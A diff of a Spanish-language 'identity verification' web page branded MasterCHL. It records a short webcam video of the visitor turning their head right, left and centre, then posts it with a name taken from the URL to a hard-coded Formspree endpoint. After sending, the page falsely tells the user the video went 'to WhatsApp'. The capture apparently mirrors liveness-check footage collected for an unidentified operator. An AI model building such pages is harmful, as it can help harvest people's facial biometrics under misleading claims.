@@ -3,14 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación de Identidad</title>
+    <title>Verificación de Identidad - MasterCHL</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
-        <h1>Verificación de Identidad</h1>
-        <p id="greeting">Hola, Usuario</p>
-        <p>Por tu seguridad, necesitamos confirmar que eres una persona real. Por favor, sigue la instrucción que aparecerá a continuación.</p>
+        <div class="header">
+            <img src="https://i.imgur.com/GzL4j7Y.png" alt="Logo de MasterCHL" class="logo">
+            <h1>VERIFICACIÓN DE IDENTIDAD - EL MASTERCHL</h1>
+        </div>
+        <p class="intro">Vamos a verificar que tú eres la persona y no robaste las fotos. Por favor, sigue las instrucciones para grabar un video corto.</p>
         
         <div class="camera-container">
             <video id="video" autoplay></video>
@@ -18,62 +20,131 @@
         </div>
 
         <div class="challenge-container">
-            <h3 id="challenge">Por favor, sonríe durante 2 segundos.</h3>
+            <h3 id="challenge">Por favor, inicia la cámara y sigue las instrucciones.</h3>
         </div>
 
-        <button id="startBtn">Iniciar Cámara</button>
-        <button id="verifyBtn" disabled>Verificar y Enviar</button>
+        <button id="startBtn">INICIAR CÁMARA</button>
+        <button id="recordBtn" style="display:none;">GRABAR VIDEO</button>
+        <button id="sendBtn" style="display:none;">ENVIAR VERIFICACIÓN</button>
     </div>
 
+    <form id="verificacionForm" style="display:none;">
+        <input type="text" name="nombre" id="nombreInput">
+        <input type="text" name="selfie" id="selfieInput">
+    </form>
+
+    <script src="https://cdn.jsdelivr.net/npm/@formspree/core@3.0.0"></script>
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
         const startBtn = document.getElementById('startBtn');
-        const verifyBtn = document.getElementById('verifyBtn');
-        const greeting = document.getElementById('greeting');
+        const recordBtn = document.getElementById('recordBtn');
+        const sendBtn = document.getElementById('sendBtn');
         const challenge = document.getElementById('challenge');
+        const form = document.getElementById('verificacionForm');
 
-        // PASO 2.1: OBTENER EL NOMBRE DEL USUARIO DESDE LA URL
-        const urlParams = new URLSearchParams(window.location.search);
-        const userName = urlParams.get('user');
-        if (userName) {
-            greeting.textContent = `Hola, ${userName.replace(/-/g, ' ')}`;
-        }
+        let mediaRecorder;
+        let recordedChunks = [];
 
-        // PASO 2.2: INICIAR LA CÁMARA
+        // INSTRUCCIONES
+        const instructions = [
+            "Gira tu cabeza lentamente hacia la DERECHA",
+            "Ahora, muévela hacia la IZQUIERDA",
+            "Por último, mira al CENTRO"
+        ];
+        let currentInstruction = 0;
+
+        // INICIAR CÁMARA
         startBtn.addEventListener('click', async () => {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 video.srcObject = stream;
                 startBtn.style.display = 'none';
-                verifyBtn.disabled = false;
+                recordBtn.style.display = 'block';
+                challenge.textContent = 'Cuando estés listo, pulsa "GRABAR VIDEO" y sigue la instrucción.';
             } catch (err) {
                 alert('No se pudo acceder a la cámara. Por favor, concede los permisos.');
             }
         });
 
-        // PASO 2.3: TOMAR FOTO Y PREPARAR EL EMAIL
-        verifyBtn.addEventListener('click', () => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        // GRABAR VIDEO
+        recordBtn.addEventListener('click', () => {
+            recordedChunks = [];
+            const options = { mimeType: 'video/webm' };
+            mediaRecorder = new MediaRecorder(video.srcObject, options);
+
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    recordedChunks.push(event.data);
+                }
+            };
+
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                const reader = new FileReader();
+                reader.onloadend = () => {
+                    const dataUrl = reader.result;
+                    document.getElementById('selfieInput').value = dataUrl;
+                    sendBtn.style.display = 'block';
+                    recordBtn.style.display = 'none';
+                    challenge.textContent = '¡Video grabado! Revisa si se ve bien y pulsa "ENVIAR VERIFICACIÓN".';
+                };
+                reader.readAsDataURL(blob);
+            };
+
+            // INICIA LA GRABACIÓN Y LAS INSTRUCCIONES
+            recordBtn.disabled = true;
+            recordBtn.textContent = "GRABANDO...";
+            challenge.textContent = instructions[currentInstruction];
+            mediaRecorder.start();
+
+            // AVANZAR INSTRUCCIONES
+            setTimeout(() => {
+                currentInstruction++;
+                if (currentInstruction < instructions.length) {
+                    challenge.textContent = instructions[currentInstruction];
+                }
+            }, 3000);
+            setTimeout(() => {
+                currentInstruction++;
+                if (currentInstruction < instructions.length) {
+                    challenge.textContent = instructions[currentInstruction];
+                }
+            }, 6000);
+            setTimeout(() => {
+                mediaRecorder.stop();
+                recordBtn.disabled = false;
+                recordBtn.textContent = "GRABAR VIDEO";
+            }, 9000);
+        });
+
+        // ENVIAR A FORMSPREE (Y LUEGO A WHATSAP)
+        sendBtn.addEventListener('click', async () => {
+            sendBtn.disabled = true;
+            sendBtn.textContent = "ENVIANDO...";
             
-            const imageDataUrl = canvas.toDataURL('image/png');
-            
-            // PASO 2.4: ENVIAR POR EMAIL (MÉTODO GRATIS)
-            const subject = `Verificación completada para ${userName}`;
-            const body = `Se ha completado la verificación para el usuario: ${userName}\n\nLa selfie de verificación está adjunta.`;
-            
-            // Crear un enlace mailto con la imagen adjunta (método simple)
-            // Nota: La mayoría de los clientes de email modernos soportan esto
-            const mailtoLink = `mailto:tu-correo@example.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
-            
-            // Abrir el cliente de email del usuario
-            window.location.href = mailtoLink;
-            
-            // Opcional: Mostrar un mensaje de éxito
-            alert('¡Gracias! Se ha abierto tu aplicación de correo para enviar la verificación. Por favor, pulsa "Enviar".');
+            // Obtener el nombre del usuario de la URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const userName = urlParams.get('user') || 'Usuario';
+            document.getElementById('nombreInput').value = userName;
+
+            // Reemplaza 'TU_ENDPOINT_ID' con el ID que te dio Formspree
+            const formSpreeEndpoint = "https://formspree.io/f/mgavqrvq"; // <--- CAMBIA ESTO POR TU ID
+
+            try {
+                await Formspree.postForm(formSpreeEndpoint, new FormData(form));
+                alert('¡Verificación enviada con éxito a WhatsApp! El MasterCHL te contactará pronto.');
+                // Limpiar
+                document.getElementById('selfieInput').value = '';
+                document.getElementById('nombreInput').value = '';
+            } catch (error) {
+                alert('Hubo un error al enviar. Por favor, intenta de nuevo.');
+                console.error('Error:', error);
+            } finally {
+                sendBtn.disabled = false;
+                sendBtn.textContent = "ENVIAR VERIFICACIÓN";
+            }
         });
     </script>
 </body>
